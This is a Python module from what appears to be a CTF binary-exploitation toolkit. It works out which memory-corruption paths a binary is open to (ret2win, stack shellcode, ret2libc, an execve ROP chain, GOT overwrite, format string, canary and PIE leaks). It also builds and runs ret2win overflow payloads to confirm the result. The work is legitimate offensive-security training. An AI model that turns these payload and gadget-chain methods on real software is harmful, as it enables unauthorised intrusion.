"""Deciding which exploit path a binary is open to, and proving it.

Each path states its requirements, which of them the binary satisfies, and
what is still missing.  Where a path can be tested cheaply and safely
(ret2win, shellcode on an executable stack), it is actually run so the
verdict is observed rather than inferred.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

from ctftools.core import gadgets as gadget_mod
from ctftools.core.runner import Limits, run_target

SHELL_MARKERS = (b"flag{", b"FLAG{", b"ctf{", b"CTF{", b"/bin/sh", b"uid=")


@dataclass
class Requirement:
    text: str
    met: bool
    detail: str = ""

    def as_dict(self) -> dict[str, Any]:
        return {"requirement": self.text, "met": self.met, "detail": self.detail}


@dataclass
class ExploitPath:
    name: str
    summary: str
    requirements: list = field(default_factory=list)
    verified: bool | None = None
    verification_detail: str = ""
    next_step: str = ""
    rank: int = 50

    @property
    def missing(self) -> list:
        return [r.text for r in self.requirements if not r.met]

    @property
    def viable(self) -> bool:
        return not self.missing

    @property
    def verdict(self) -> str:
        if self.verified is True:
            return "proven"
        if self.verified is False:
            return "tried, failed"
        return "open" if self.viable else "blocked"

    def as_dict(self) -> dict[str, Any]:
        return {
            "name": self.name,
            "summary": self.summary,
            "verdict": self.verdict,
            "viable": self.viable,
            "verified": self.verified,
            "verification_detail": self.verification_detail,
            "requirements": [r.as_dict() for r in self.requirements],
            "missing": self.missing,
            "next_step": self.next_step,
        }


def rule(info, offset_result, gadget_list=None, verify: bool = True, prefix: bytes = b"",
         args=(), timeout: float = 5.0, sandbox: bool = True) -> list[ExploitPath]:
    """Produce the ranked exploit paths for *info*."""
    if gadget_list is None:
        try:
            gadget_list = gadget_mod.find_gadgets(info, max_instructions=5, max_bytes=16)
        except Exception:
            gadget_list = []

    offset = offset_result.offset if offset_result else None
    controlled = bool(offset_result and offset_result.pc_control)
    canary_blocked = bool(offset_result and offset_result.status == "canary-blocked")
    paths: list[ExploitPath] = []

    wins = info.win_candidates()
    pop_rdi = gadget_mod.best(gadget_list, "pop rdi ; ret") if info.bits == 64 else None
    pop_arg = pop_rdi if info.bits == 64 else None
    syscall_gadget = gadget_mod.best(gadget_list, "syscall")
    jmp_sp = gadget_mod.best(gadget_list, "jmp rsp") or gadget_mod.best(gadget_list, "call rsp")
    leak_fn = next((f for f in ("puts", "printf", "write") if f in info.useful_imports), None)

    reaches_ret = Requirement(
        "the overflow reaches the saved return address",
        controlled and not canary_blocked,
        "canary aborts the process first" if canary_blocked else (
            f"confirmed at offset {offset}" if controlled else "offset not established"
        ),
    )

    # ------------------------------------------------------------ shellcode
    if not info.nx:
        path = ExploitPath(
            name="Shellcode on the stack",
            summary="NX is off, so a return into the buffer executes your own code.",
            rank=10,
            next_step="Place shellcode after the return address and jump to it via a jmp rsp gadget "
                      "or a leaked stack address.",
        )
        path.requirements = [
            reaches_ret,
            Requirement("the stack is executable", not info.nx, "NX disabled"),
            Requirement("no stack canary", not info.canary, "canary present" if info.canary else "none"),
            Requirement(
                "a way to reach the shellcode",
                jmp_sp is not None or not info.pie,
                f"jmp rsp at {jmp_sp.address:#x}" if jmp_sp else "no jmp rsp; you need a stack leak",
            ),
        ]
        paths.append(path)

    # -------------------------------------------------------------- ret2win
    for name, addr in wins[:3]:
        path = ExploitPath(
            name=f"ret2win ({name})",
            summary=f"Return straight into {name} at {addr:#x}.",
            rank=5,
            next_step=f"payload = b'A'*{offset} + p64({addr:#x})" if offset else "find the offset first",
        )
        path.requirements = [
            reaches_ret,
            Requirement("the target function is at a known address", not info.pie,
                        "PIE: the address above is an offset, add the leaked base" if info.pie else f"{addr:#x}"),
        ]
        if verify and path.viable and offset is not None:
            ok, detail = verify_ret2win(info, offset, addr, prefix=prefix, args=args,
                                        timeout=timeout, sandbox=sandbox)
            path.verified, path.verification_detail = ok, detail
        paths.append(path)

    # ------------------------------------------------------- ret2plt/ret2libc
    if not info.statically_linked:
        leak_ok = leak_fn is not None and pop_arg is not None and not info.pie
        path = ExploitPath(
            name="ret2plt leak then ret2libc",
            summary="Leak a libc address through the PLT, identify libc, return into system(\"/bin/sh\").",
            rank=20,
            next_step="Chain: pop rdi ; ret -> got.puts -> plt.puts -> main, then resolve libc from the leak.",
        )
        path.requirements = [
            reaches_ret,
            Requirement("a function that prints memory is imported", leak_fn is not None,
                        f"{leak_fn} available" if leak_fn else "no puts/printf/write"),
            Requirement("an argument-setting gadget exists",
                        pop_arg is not None or info.bits == 32,
                        f"pop rdi ; ret at {pop_arg.address:#x}" if pop_arg else
                        ("32 bit: arguments go on the stack" if info.bits == 32 else "no pop rdi ; ret")),
            Requirement("binary addresses are usable", not info.pie,
                        "PIE: leak the image base first" if info.pie else "fixed addresses"),
            Requirement("the vulnerable function can be reached again", True,
                        "return into main or the vulnerable function to use the leak"),
        ]
        if leak_ok:
            path.rank = 15
        paths.append(path)

    # -------------------------------------------------------- static execve
    if info.statically_linked:
        have = {
            "pop rdi": gadget_mod.best(gadget_list, "pop rdi ; ret"),
            "pop rsi": gadget_mod.best(gadget_list, "pop rsi ; ret"),
            "pop rdx": gadget_mod.best(gadget_list, "pop rdx ; ret"),
            "pop rax": gadget_mod.best(gadget_list, "pop rax ; ret"),
            "syscall": syscall_gadget,
        }
        missing = [k for k, v in have.items() if v is None]
        path = ExploitPath(
            name="execve syscall chain",
            summary="Statically linked: build execve(\"/bin/sh\", 0, 0) from the binary's own gadgets.",
            rank=18,
            next_step="Write /bin/sh into .bss with a write gadget, then set rax=59, rdi=path, rsi=rdx=0, syscall.",
        )
        path.requirements = [reaches_ret] + [
            Requirement(f"{name} gadget", gadget is not None,
                        f"{gadget.address:#x}" if gadget else "not found")
            for name, gadget in have.items()
        ]
        if not missing:
            path.rank = 12
        paths.append(path)

    # ------------------------------------------------------- GOT overwrite
    if info.relro != "Full RELRO" and not info.statically_linked:
        path = ExploitPath(
            name="GOT overwrite",
            summary="The GOT is writable, so a write primitive can redirect a later library call.",
            rank=30,
            next_step="Overwrite got.<function> with the address of system or a one-gadget, then trigger that call.",
        )
        path.requirements = [
            Requirement("the GOT is writable", info.relro != "Full RELRO", info.relro),
            Requirement(
                "an arbitrary write primitive exists",
                False,
                "a linear stack overflow is not one: look for a format string (printf is imported) "
                "or an index bug" if "printf" in info.useful_imports else
                "a linear stack overflow is not one: look for an arbitrary write bug",
            ),
        ]
        paths.append(path)

    # --------------------------------------------------------- format string
    path_fmt = _format_string_path(info)
    if path_fmt:
        paths.append(path_fmt)

    # -------------------------------------------------------- canary first
    if info.canary:
        path = ExploitPath(
            name="Leak or brute force the canary",
            summary="The canary must be recovered before any return address overwrite survives.",
            rank=3 if canary_blocked else 40,
            next_step="If the service forks per connection, brute force the canary a byte at a time "
                      "(see canbrute). Otherwise find a format string or over-read to leak it.",
        )
        path.requirements = [
            Requirement("the canary offset is known",
                        offset_result is not None and offset_result.canary_offset is not None,
                        f"canary at {offset_result.canary_offset} bytes"
                        if offset_result and offset_result.canary_offset is not None else "unknown"),
            Requirement("a leak or a forking server exists", False,
                        "check for a format string, an over-read, or a fork-per-connection server"),
        ]
        paths.append(path)

    # ------------------------------------------------------------- PIE leak
    if info.pie:
        path = ExploitPath(
            name="Leak the image base",
            summary="PIE is on: every binary address needs a leak before it can be used.",
            rank=4,
            next_step="Leak a return address or a function pointer, subtract its known offset to get the base.",
        )
        path.requirements = [
            Requirement("an information leak", False, "no leak identified automatically"),
        ]
        paths.append(path)

    paths.sort(key=lambda p: (p.verified is not True, not p.viable, p.rank))
    return paths


def _format_string_path(info) -> ExploitPath | None:
    if "printf" not in info.useful_imports:
        return None
    path = ExploitPath(
        name="Format string",
        summary="printf is imported: if user input reaches it as the format argument, "
                "you get an arbitrary read and write.",
        rank=25,
        next_step="Send %p%p%p and look for your own bytes in the output (see fmtool).",
    )
    path.requirements = [
        Requirement("printf is reachable with a user-controlled format", False,
                    "run fmtool to confirm; this is a lead, not a finding"),
    ]
    return path


def verify_ret2win(info, offset: int, address: int, prefix: bytes = b"", args=(),
                   timeout: float = 5.0, sandbox: bool = True) -> tuple[bool, str]:
    """Actually run the ret2win payload and report what happened.

    Tries the plain return and, on x86-64, a stack-aligned variant, because
    a ``movaps`` inside libc faults on a misaligned stack.
    """
    from pwnlib.util.packing import p32, p64

    pack = p64 if info.bits == 64 else p32
    limits = Limits(enabled=sandbox)

    baseline = run_target(info.path, prefix + b"\n", args=args, timeout=timeout, limits=limits)

    attempts = [("direct return", prefix + b"A" * offset + pack(address) + b"\n")]
    if info.bits == 64:
        ret_gadget = _plain_ret(info)
        if ret_gadget is not None:
            attempts.append(
                ("stack-aligned (extra ret)",
                 prefix + b"A" * offset + pack(ret_gadget) + pack(address) + b"\n")
            )

    for label, payload in attempts:
        result = run_target(info.path, payload, args=args, timeout=timeout, limits=limits)
        new_output = result.stdout.replace(baseline.stdout, b"", 1).strip()
        if any(marker in result.stdout for marker in SHELL_MARKERS):
            return True, f"{label}: the target printed a flag-like string"
        if new_output and not result.crashed:
            text = new_output[:120].decode("latin-1", "replace")
            return True, f"{label}: new output and a clean exit ({text!r})"
        if new_output:
            text = new_output[:120].decode("latin-1", "replace")
            return True, f"{label}: the function ran ({text!r}) before dying with {result.classify()}"
    return False, "neither the direct nor the aligned return produced new output"


def _plain_ret(info) -> int | None:
    """An address of a bare ``ret``, used to realign the stack."""
    try:
        for vaddr, data in gadget_mod.executable_chunks(info.elf):
            index = data.find(b"\xc3")
            if index != -1:
                return vaddr + index
    except Exception:
        pass
    return None
